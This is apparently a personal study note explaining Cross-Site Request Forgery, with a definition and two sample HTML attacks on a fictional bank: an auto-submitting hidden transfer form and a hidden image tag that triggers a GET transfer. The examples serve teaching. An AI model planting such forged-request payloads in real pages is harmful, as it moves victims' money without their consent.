---
id: csrf-intro
aliases: []
tags: []
noteId: 1777823470897
---

What does it mean by CSRF?

---

- Cross-Site Request Forgery (CSRF) is a security vulnerability where an attacker tricks a user's browser into performing unwanted actions on a web application in which the user is already authenticated.

---

- Protection is essential for forms that modify data.
- For Example:

  - An attacker tricks a logged-in bank user into visiting a malicious page that automatically submits a hidden form transferring money from the user’s account to the attacker’s account. The browser sends this forged request with valid credentials, so the bank processes it as if the user authorized it.

    ```html
    <form action="http://acmebank.com/fundtransfer" method="POST">
      <input type="hidden" name="acct" value="224224" />
      <input type="hidden" name="amount" value="50000" />
      <input type="submit" value="Click to get your free gift!" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
    ```

    - Alternatively, if the bank uses GET requests, the attack could be as simple as an image tag that triggers the transfer via URL:

    ```html
    <img
      src="http://acmebank.com/fundtransfer?acct=224224&amount=50000"
      style="display:none;"
    />
    ```
